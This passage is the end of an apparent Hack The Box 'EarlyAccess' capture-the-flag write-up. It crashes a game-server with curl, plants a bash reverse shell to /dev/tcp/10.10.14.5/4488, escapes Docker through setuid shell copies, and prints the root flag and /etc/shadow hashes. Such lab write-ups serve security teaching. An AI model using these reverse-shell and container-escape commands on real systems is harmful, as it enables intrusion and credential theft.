<span id="cb50-22"><a href="#cb50-22" aria-hidden="true" tabindex="-1"></a>                                    <span class="dt">&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">"/scissors"</span><span class="dt">&gt;&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">"x"</span><span class="ot"> alt</span><span class="op">=</span><span class="st">"scissors"</span><span class="dt">&gt;&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span>
<span id="cb50-23"><a href="#cb50-23" aria-hidden="true" tabindex="-1"></a>                                <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-24"><a href="#cb50-24" aria-hidden="true" tabindex="-1"></a>                                <span class="dt">&lt;</span><span class="kw">h3</span><span class="dt">&gt;</span>Result of last game:<span class="dt">&lt;/</span><span class="kw">h3</span><span class="dt">&gt;</span></span>
<span id="cb50-25"><a href="#cb50-25" aria-hidden="true" tabindex="-1"></a>                                </span>
<span id="cb50-26"><a href="#cb50-26" aria-hidden="true" tabindex="-1"></a>                            <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-27"><a href="#cb50-27" aria-hidden="true" tabindex="-1"></a>                        <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-28"><a href="#cb50-28" aria-hidden="true" tabindex="-1"></a>                    <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-29"><a href="#cb50-29" aria-hidden="true" tabindex="-1"></a>                <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-30"><a href="#cb50-30" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-31"><a href="#cb50-31" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span>
<span id="cb50-32"><a href="#cb50-32" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb50-33"><a href="#cb50-33" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>If we cURL the game-server and tries to make it autoplay, maybe we can start so many instances that it crashes.</p>
<div class="sourceCode" id="cb51"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/var/mail$</span> curl <span class="at">-v</span> http://172.19.0.2:9999/autoplay</span>
<span id="cb51-2"><a href="#cb51-2" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb51-3"><a href="#cb51-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div <span class="va">class</span><span class="op">=</span><span class="st">"card-body"</span><span class="op">&gt;</span></span>
<span id="cb51-4"><a href="#cb51-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>form <span class="va">action</span><span class="op">=</span><span class="st">"/autoplay"</span> <span class="va">method</span><span class="op">=</span><span class="st">"POST"</span><span class="op">&gt;</span></span>
<span id="cb51-5"><a href="#cb51-5" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span>ul <span class="va">style</span><span class="op">=</span><span class="st">"list-style-type: none"</span><span class="op">&gt;</span></span>
<span id="cb51-6"><a href="#cb51-6" aria-hidden="true" tabindex="-1"></a>            <span class="op">&lt;</span>li<span class="op">&gt;</span></span>
<span id="cb51-7"><a href="#cb51-7" aria-hidden="true" tabindex="-1"></a>                <span class="op">&lt;</span>label <span class="va">for</span><span class="op">=</span><span class="st">"rounds"</span><span class="op">&gt;</span>Rounds:<span class="op">&lt;</span>/label<span class="op">&gt;</span></span>
<span id="cb51-8"><a href="#cb51-8" aria-hidden="true" tabindex="-1"></a>                <span class="op">&lt;</span>input <span class="va">type</span><span class="op">=</span><span class="st">"number"</span> <span class="va">placeholder</span><span class="op">=</span><span class="st">"3"</span> <span class="va">value</span><span class="op">=</span><span class="st">"3"</span> <span class="va">name</span><span class="op">=</span><span class="st">"rounds"</span> <span class="va">min</span><span class="op">=</span><span class="st">"1"</span> <span class="va">max</span><span class="op">=</span><span class="st">"100"</span><span class="op">&gt;</span></span>
<span id="cb51-9"><a href="#cb51-9" aria-hidden="true" tabindex="-1"></a>                <span class="op">&lt;</span>button <span class="va">id</span><span class="op">=</span><span class="st">"btn"</span> <span class="va">class</span><span class="op">=</span><span class="st">"btn btn-outline-dark center play-btn"</span> <span class="va">onclick</span><span class="op">=</span><span class="st">""</span><span class="op">&gt;</span>Start <span class="ex">game</span><span class="op">&lt;</span>/button<span class="op">&gt;</span></span>
<span id="cb51-10"><a href="#cb51-10" aria-hidden="true" tabindex="-1"></a>            <span class="op">&lt;</span>/li<span class="op">&gt;</span></span>
<span id="cb51-11"><a href="#cb51-11" aria-hidden="true" tabindex="-1"></a>            <span class="op">&lt;</span>li<span class="op">&gt;</span></span>
<span id="cb51-12"><a href="#cb51-12" aria-hidden="true" tabindex="-1"></a>                <span class="op">&lt;</span>label <span class="va">for</span><span class="op">=</span><span class="st">"verbose"</span><span class="op">&gt;</span>Verbose<span class="op">&lt;</span>/label<span class="op">&gt;</span></span>
<span id="cb51-13"><a href="#cb51-13" aria-hidden="true" tabindex="-1"></a>                <span class="op">&lt;</span>input <span class="va">type</span><span class="op">=</span><span class="st">"checkbox"</span> <span class="va">name</span><span class="op">=</span><span class="st">"verbose"</span> <span class="va">id</span><span class="op">=</span><span class="st">"verbose"</span> <span class="va">value</span><span class="op">=</span><span class="st">"false"</span><span class="op">&gt;</span></span>
<span id="cb51-14"><a href="#cb51-14" aria-hidden="true" tabindex="-1"></a>            <span class="op">&lt;</span>/li<span class="op">&gt;</span></span>
<span id="cb51-15"><a href="#cb51-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span>/ul<span class="op">&gt;</span></span>
<span id="cb51-16"><a href="#cb51-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>/form<span class="op">&gt;</span></span>
<span id="cb51-17"><a href="#cb51-17" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>/div<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb52"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a>drew@earlyaccess:/dev/shm$ curl -X POST http://172.19.0.2:9999/autoplay -d "rounds=3<span class="er">&amp;</span>verbose=true"</span>
<span id="cb52-2"><a href="#cb52-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;&lt;</span><span class="kw">body</span><span class="dt">&gt;&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Starting autoplay with 3 rounds<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;&lt;</span><span class="kw">p</span><span class="dt">&gt;&lt;</span><span class="kw">h3</span><span class="dt">&gt;</span>Playing round: 1<span class="dt">&lt;/</span><span class="kw">h3</span><span class="dt">&gt;</span></span>
<span id="cb52-3"><a href="#cb52-3" aria-hidden="true" tabindex="-1"></a>Outcome of round: loss<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
<span id="cb52-4"><a href="#cb52-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;&lt;</span><span class="kw">h3</span><span class="dt">&gt;</span>Playing round: 2<span class="dt">&lt;/</span><span class="kw">h3</span><span class="dt">&gt;</span></span>
<span id="cb52-5"><a href="#cb52-5" aria-hidden="true" tabindex="-1"></a>Outcome of round: win<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
<span id="cb52-6"><a href="#cb52-6" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;&lt;</span><span class="kw">h3</span><span class="dt">&gt;</span>Playing round: 3<span class="dt">&lt;/</span><span class="kw">h3</span><span class="dt">&gt;</span></span>
<span id="cb52-7"><a href="#cb52-7" aria-hidden="true" tabindex="-1"></a>Outcome of round: loss<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
<span id="cb52-8"><a href="#cb52-8" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">h4</span><span class="dt">&gt;</span>Stats:<span class="dt">&lt;/</span><span class="kw">h4</span><span class="dt">&gt;&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Wins: 1<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Losses: 2<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Ties: 0<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;&lt;</span><span class="kw">a</span><span class="ot"> href</span><span class="op">=</span><span class="st">"/autoplay"</span><span class="dt">&gt;</span>Go back<span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;&lt;/</span><span class="kw">body</span><span class="dt">&gt;&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Crash the application by entering a invalid (decimal) value. Upload our <code>evil.sh</code> reverse shell to <code>/etc/docker-entrypoint.d</code> and capture the incoming shell.</p>
<p><strong>Note:</strong> <code>/etc/docker-entrypoint.d</code> is cleared regularly, so keep re-creating <code>evil.sh</code> if it’s removed before the game-server restarts.</p>
<div class="sourceCode" id="cb53"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb53-1"><a href="#cb53-1" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/dev/shm$</span> curl <span class="at">-X</span> POST http://172.19.0.2:9999/autoplay <span class="at">-d</span> <span class="st">"rounds=99.999999999&amp;verbose=true"</span></span>
<span id="cb53-2"><a href="#cb53-2" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/opt/docker-entrypoint.d$</span> echo <span class="at">-e</span> <span class="st">'#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.14.5/4488 0&gt;&amp;1'</span> <span class="op">&gt;</span> evil.sh <span class="kw">&amp;&amp;</span> <span class="fu">chmod</span> +x evil.sh</span>
<span id="cb53-3"><a href="#cb53-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb53-4"><a href="#cb53-4" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb53-5"><a href="#cb53-5" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nc <span class="at">-lvnp</span> 4488                             </span>
<span id="cb53-6"><a href="#cb53-6" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
<span id="cb53-7"><a href="#cb53-7" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.5</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.110]</span> 42248</span>
<span id="cb53-8"><a href="#cb53-8" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> cannot set terminal process group <span class="er">(</span><span class="ex">1</span><span class="kw">)</span><span class="bu">:</span> Inappropriate ioctl for device</span>
<span id="cb53-9"><a href="#cb53-9" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> no job control in this shell</span>
<span id="cb53-10"><a href="#cb53-10" aria-hidden="true" tabindex="-1"></a><span class="ex">root@game-server:/usr/src/app#</span> id <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
<span id="cb53-11"><a href="#cb53-11" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span> <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
<span id="cb53-12"><a href="#cb53-12" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
<span id="cb53-13"><a href="#cb53-13" aria-hidden="true" tabindex="-1"></a><span class="ex">game-server</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-4-1" class="level3">
<h3 class="anchored" data-anchor-id="step-4-1">Step 4</h3>
<p>We are in a unprivileged docker, unable to run docker-commands, capsh-commands or mounting directories. Looking in mount we can see that /dev/sda1 is already mounted to /docker-entrypoint.d</p>
<div class="sourceCode" id="cb54"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@game-server:/docker-entrypoint.d#</span> mount</span>
<span id="cb54-2"><a href="#cb54-2" aria-hidden="true" tabindex="-1"></a><span class="ex">..</span></span>
<span id="cb54-3"><a href="#cb54-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/dev/sda1</span> on /docker-entrypoint.d type ext4 <span class="er">(</span><span class="ex">rw,relatime,errors=remount-ro</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>This means that we can moves files and/or scripts from the game-server, to the host machine. And since we are root on the docker/game-server, we are able to use ‘SetUID’ bit to make scripts execute like root on the host machine.</p>
<div class="sourceCode" id="cb55"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@game-server:/docker-entrypoint.d#</span> cp /bin/bash . <span class="kw">&amp;&amp;</span> <span class="fu">chmod</span> u+s bash</span>
<span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root@game-server:/docker-entrypoint.d#</span> cp /bin/sh . <span class="kw">&amp;&amp;</span> <span class="fu">chmod</span> u+s sh</span>
<span id="cb55-3"><a href="#cb55-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb55-4"><a href="#cb55-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/opt/docker-entrypoint.d$</span> ls <span class="at">-al</span></span>
<span id="cb55-5"><a href="#cb55-5" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 1204</span>
<span id="cb55-6"><a href="#cb55-6" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-t</span> 2 root drew    4096 Sep 30 13:42 .</span>
<span id="cb55-7"><a href="#cb55-7" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 4 root root    4096 Jul 14 12:26 ..</span>
<span id="cb55-8"><a href="#cb55-8" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwsr-xr-x</span> 1 root root 1099016 Sep 30 13:42 bash</span>
<span id="cb55-9"><a href="#cb55-9" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwsr-xr-x</span> 1 root root  117208 Sep 30 13:42 sh</span>
<span id="cb55-10"><a href="#cb55-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb55-11"><a href="#cb55-11" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/opt/docker-entrypoint.d$</span> ./bash</span>
<span id="cb55-12"><a href="#cb55-12" aria-hidden="true" tabindex="-1"></a><span class="ex">./bash:</span> error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory</span>
<span id="cb55-13"><a href="#cb55-13" aria-hidden="true" tabindex="-1"></a><span class="ex">drew@earlyaccess:/opt/docker-entrypoint.d$</span> ./sh</span>
<span id="cb55-14"><a href="#cb55-14" aria-hidden="true" tabindex="-1"></a><span class="co"># id &amp;&amp; hostname</span></span>
<span id="cb55-15"><a href="#cb55-15" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">drew</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">drew</span><span class="kw">)</span> <span class="va">euid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">drew</span><span class="kw">)</span></span>
<span id="cb55-16"><a href="#cb55-16" aria-hidden="true" tabindex="-1"></a><span class="ex">earlyaccess</span></span>
<span id="cb55-17"><a href="#cb55-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb55-18"><a href="#cb55-18" aria-hidden="true" tabindex="-1"></a><span class="co"># cat /root/root.txt</span></span>
<span id="cb55-19"><a href="#cb55-19" aria-hidden="true" tabindex="-1"></a><span class="ex">a3537b30eb1073d19779ae81448520ee</span></span>
<span id="cb55-20"><a href="#cb55-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb55-21"><a href="#cb55-21" aria-hidden="true" tabindex="-1"></a><span class="co"># cat /etc/shadow</span></span>
<span id="cb55-22"><a href="#cb55-22" aria-hidden="true" tabindex="-1"></a><span class="ex">root:</span><span class="va">$6$2</span><span class="ex">QbMgoSoxCmfitM7</span><span class="va">$fivhckW6N0Qk8Y3</span><span class="ex">.RDUy8iFKm/BcwEUkUDwKZa5s3LC6bhJuBwPxaqUpUJ76oOiI10i7CfcpPj1CcwVWsRLoz/:18871:0:99999:7:::</span></span>
<span id="cb55-23"><a href="#cb55-23" aria-hidden="true" tabindex="-1"></a><span class="ex">drew:</span><span class="va">$6$AADwRDsC1bSDK3pl$IixXS9pA</span><span class="ex">.Gl3wLIkGCERTSE9tBeZtpRkw.gipzq9Z/MgKmh3mpgSG7TySc3EFyUfKH7B4VoJo3OtSPVwP627Q0:18771:0:99999:7:::</span></span>
<span id="cb55-24"><a href="#cb55-24" aria-hidden="true" tabindex="-1"></a><span class="ex">game-adm:</span><span class="va">$6$SlEudWDN76ied096$2</span><span class="ex">sRRXzh/aT.0dlO6liqqNdHrrOoZHgJXf1c4dHsXByibZvSsYG3wy7vIQQnJpNpphZAGVYTp0Sf5QzHk1JA8a1:18822:0:99999:7:::</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
<section id="references" class="level1">
<h1>REFERENCES</h1>
<p>Exploit LFI / RFI: https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md</p>
<p>NC Port scan: https://www.cyberciti.biz/faq/linux-port-scanning/</p>
<p>Ping Sweep Loop: https://www.rubyguides.com/2012/02/cli-ninja-ping-sweep/</p>
<p>Docker, Writable Folder: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mount-writable-folder</p>


</section>

</main> <!-- /main -->
<script id="quarto-html-after-body" type="application/javascript">
  window.document.addEventListener("DOMContentLoaded", function (event) {
    const icon = "";
    const anchorJS = new window.AnchorJS();
    anchorJS.options = {
      placement: 'right',
      icon: icon
    };
    anchorJS.add('.anchored');
    const isCodeAnnotation = (el) => {
      for (const clz of el.classList) {
        if (clz.startsWith('code-annotation-')) {                     
          return true;
        }
      }
      return false;
    }
    const onCopySuccess = function(e) {
      // button target
      const button = e.trigger;
      // don't keep focus
      button.blur();
      // flash "checked"
      button.classList.add('code-copy-button-checked');
      var currentTitle = button.getAttribute("title");
      button.setAttribute("title", "Copied!");
      let tooltip;
      if (window.bootstrap) {
        button.setAttribute("data-bs-toggle", "tooltip");
        button.setAttribute("data-bs-placement", "left");
        button.setAttribute("data-bs-title", "Copied!");
        tooltip = new bootstrap.Tooltip(button, 
          { trigger: "manual", 
            customClass: "code-copy-button-tooltip",
            offset: [0, -8]});
        tooltip.show();    
      }
      setTimeout(function() {
        if (tooltip) {
          tooltip.hide();
          button.removeAttribute("data-bs-title");
          button.removeAttribute("data-bs-toggle");
          button.removeAttribute("data-bs-placement");
        }
        button.setAttribute("title", currentTitle);
        button.classList.remove('code-copy-button-checked');
      }, 1000);
      // clear code selection
      e.clearSelection();
    }
    const getTextToCopy = function(trigger) {
        const codeEl = trigger.previousElementSibling.cloneNode(true);
        for (const childEl of codeEl.children) {
          if (isCodeAnnotation(childEl)) {
            childEl.remove();
          }
        }
        return codeEl.innerText;
    }
    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
      text: getTextToCopy
    });
    clipboard.on('success', onCopySuccess);
    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
        text: getTextToCopy,
        container: window.document.getElementById('quarto-embedded-source-code-modal')
      });
      clipboardModal.on('success', onCopySuccess);
    }
      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
      var mailtoRegex = new RegExp(/^mailto:/);
        var filterRegex = new RegExp("https:\/\/exploit\.se");
      var isInternal = (href) => {
          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
      }
      // Inspect non-navigation links and adorn them if external
     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
      for (var i=0; i<links.length; i++) {
        const link = links[i];
        if (!isInternal(link.href)) {
          // undo the damage that might have been done by quarto-nav.js in the case of
          // links that we want to consider external
          if (link.dataset.originalHref !== undefined) {
            link.href = link.dataset.originalHref;
          }
        }
      }
    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
      const config = {
        allowHTML: true,
        maxWidth: 500,
        delay: 100,
        arrow: false,
        appendTo: function(el) {
            return el.parentElement;
        },
        interactive: true,
        interactiveBorder: 10,
        theme: 'quarto',
        placement: 'bottom-start',
      };
      if (contentFn) {
        config.content = contentFn;
      }
      if (onTriggerFn) {
        config.onTrigger = onTriggerFn;
      }
      if (onUntriggerFn) {
        config.onUntrigger = onUntriggerFn;
      }
      window.tippy(el, config); 
    }
    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
    for (var i=0; i<noterefs.length; i++) {
      const ref = noterefs[i];
      tippyHover(ref, function() {
        // use id or data attribute instead here
        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
        try { href = new URL(href).hash; } catch {}
        const id = href.replace(/^#\/?/, "");
        const note = window.document.getElementById(id);
        if (note) {
          return note.innerHTML;
        } else {
          return "";
        }
      });
    }
    const xrefs = window.document.querySelectorAll('a.quarto-xref');
    const processXRef = (id, note) => {
      // Strip column container classes
      const stripColumnClz = (el) => {
        el.classList.remove("page-full", "page-columns");
        if (el.children) {
          for (const child of el.children) {
            stripColumnClz(child);
          }
        }
      }
      stripColumnClz(note)
      if (id === null || id.startsWith('sec-')) {
        // Special case sections, only their first couple elements
        const container = document.createElement("div");
        if (note.children && note.children.length > 2) {
          container.appendChild(note.children[0].cloneNode(true));
          for (let i = 1; i < note.children.length; i++) {
            const child = note.children[i];
            if (child.tagName === "P" && child.innerText === "") {
              continue;
            } else {
              container.appendChild(child.cloneNode(true));
              break;
            }
          }
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(container);
          }
          return container.innerHTML
        } else {
          if (window.Quarto?.typesetMath) {
            window.Quarto.typesetMath(note);
          }
          return note.innerHTML;
        }
      } else {
        // Remove any anchor links if they are present
        const anchorLink = note.querySelector('a.anchorjs-link');
        if (anchorLink) {
          anchorLink.remove();
        }
        if (window.Quarto?.typesetMath) {
          window.Quarto.typesetMath(note);
        }
        if (note.classList.contains("callout")) {
          return note.outerHTML;
        } else {
          return note.innerHTML;
        }
      }
    }
    for (var i=0; i<xrefs.length; i++) {
      const xref = xrefs[i];
      tippyHover(xref, undefined, function(instance) {
        instance.disable();
        let url = xref.getAttribute('href');
        let hash = undefined; 
        if (url.startsWith('#')) {
          hash = url;
        } else {
          try { hash = new URL(url).hash; } catch {}
        }
        if (hash) {
          const id = hash.replace(/^#\/?/, "");
          const note = window.document.getElementById(id);
          if (note !== null) {
            try {
              const html = processXRef(id, note.cloneNode(true));
              instance.setContent(html);
            } finally {
              instance.enable();
              instance.show();
            }
          } else {
            // See if we can fetch this
            fetch(url.split('#')[0])
            .then(res => res.text())
            .then(html => {
              const parser = new DOMParser();
              const htmlDoc = parser.parseFromString(html, "text/html");
              const note = htmlDoc.getElementById(id);
              if (note !== null) {
                const html = processXRef(id, note);
                instance.setContent(html);
              } 
            }).finally(() => {
              instance.enable();
              instance.show();
            });
          }
        } else {
          // See if we can fetch a full url (with no hash to target)
          // This is a special case and we should probably do some content thinning / targeting
          fetch(url)
          .then(res => res.text())
          .then(html => {
            const parser = new DOMParser();
            const htmlDoc = parser.parseFromString(html, "text/html");
            const note = htmlDoc.querySelector('main.content');
            if (note !== null) {
              // This should only happen for chapter cross references
              // (since there is no id in the URL)
              // remove the first header
              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
                note.children[0].remove();
              }
              const html = processXRef(null, note);
              instance.setContent(html);
            } 
          }).finally(() => {
            instance.enable();
            instance.show();
          });
        }
      }, function(instance) {
      });
    }
        let selectedAnnoteEl;
        const selectorForAnnotation = ( cell, annotation) => {
          let cellAttr = 'data-code-cell="' + cell + '"';
          let lineAttr = 'data-code-annotation="' +  annotation + '"';
          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
          return selector;
        }
        const selectCodeLines = (annoteEl) => {
          const doc = window.document;
          const targetCell = annoteEl.getAttribute("data-target-cell");
          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
          const lineIds = lines.map((line) => {
            return targetCell + "-" + line;
          })
          let top = null;
          let height = null;
          let parent = null;
          if (lineIds.length > 0) {
              //compute the position of the single el (top and bottom and make a div)
              const el = window.document.getElementById(lineIds[0]);
              top = el.offsetTop;
              height = el.offsetHeight;
              parent = el.parentElement.parentElement;
            if (lineIds.length > 1) {
              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
              height = bottom - top;
            }
            if (top !== null && height !== null && parent !== null) {
              // cook up a div (if necessary) and position it 
              let div = window.document.getElementById("code-annotation-line-highlight");
              if (div === null) {
                div = window.document.createElement("div");
                div.setAttribute("id", "code-annotation-line-highlight");
                div.style.position = 'absolute';
                parent.appendChild(div);
              }
              div.style.top = top - 2 + "px";
              div.style.height = height + 4 + "px";
              div.style.left = 0;
              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
              if (gutterDiv === null) {
                gutterDiv = window.document.createElement("div");
                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
                gutterDiv.style.position = 'absolute';
                const codeCell = window.document.getElementById(targetCell);
                const gutter = codeCell.querySelector('.code-annotation-gutter');
                gutter.appendChild(gutterDiv);
              }
              gutterDiv.style.top = top - 2 + "px";
              gutterDiv.style.height = height + 4 + "px";
            }
            selectedAnnoteEl = annoteEl;
          }
        };
        const unselectCodeLines = () => {
          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
          elementsIds.forEach((elId) => {
            const div = window.document.getElementById(elId);
            if (div) {
              div.remove();
            }
          });
          selectedAnnoteEl = undefined;
        };
          // Handle positioning of the toggle
      window.addEventListener(
        "resize",
        throttle(() => {
          elRect = undefined;
          if (selectedAnnoteEl) {
            selectCodeLines(selectedAnnoteEl);
          }
        }, 10)
      );
      function throttle(fn, ms) {
      let throttle = false;
      let timer;
        return (...args) => {
          if(!throttle) { // first call gets through
              fn.apply(this, args);
              throttle = true;
          } else { // all the others get throttled
              if(timer) clearTimeout(timer); // cancel #2
              timer = setTimeout(() => {
                fn.apply(this, args);
                timer = throttle = false;
              }, ms);
          }
        };
      }
        // Attach click handler to the DT
        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
        for (const annoteDlNode of annoteDls) {
          annoteDlNode.addEventListener('click', (event) => {
            const clickedEl = event.target;
            if (clickedEl !== selectedAnnoteEl) {
              unselectCodeLines();
              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
              if (activeEl) {
                activeEl.classList.remove('code-annotation-active');
              }
              selectCodeLines(clickedEl);
              clickedEl.classList.add('code-annotation-active');
            } else {
              // Unselect the line
              unselectCodeLines();
              clickedEl.classList.remove('code-annotation-active');
            }
          });
        }
    const findCites = (el) => {
      const parentEl = el.parentElement;
      if (parentEl) {
        const cites = parentEl.dataset.cites;
        if (cites) {
          return {
            el,
            cites: cites.split(' ')
          };
        } else {
          return findCites(el.parentElement)
        }
      } else {
        return undefined;
      }
    };
    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
    for (var i=0; i<bibliorefs.length; i++) {
      const ref = bibliorefs[i];
      const citeInfo = findCites(ref);
      if (citeInfo) {
        tippyHover(citeInfo.el, function() {
          var popup = window.document.createElement('div');
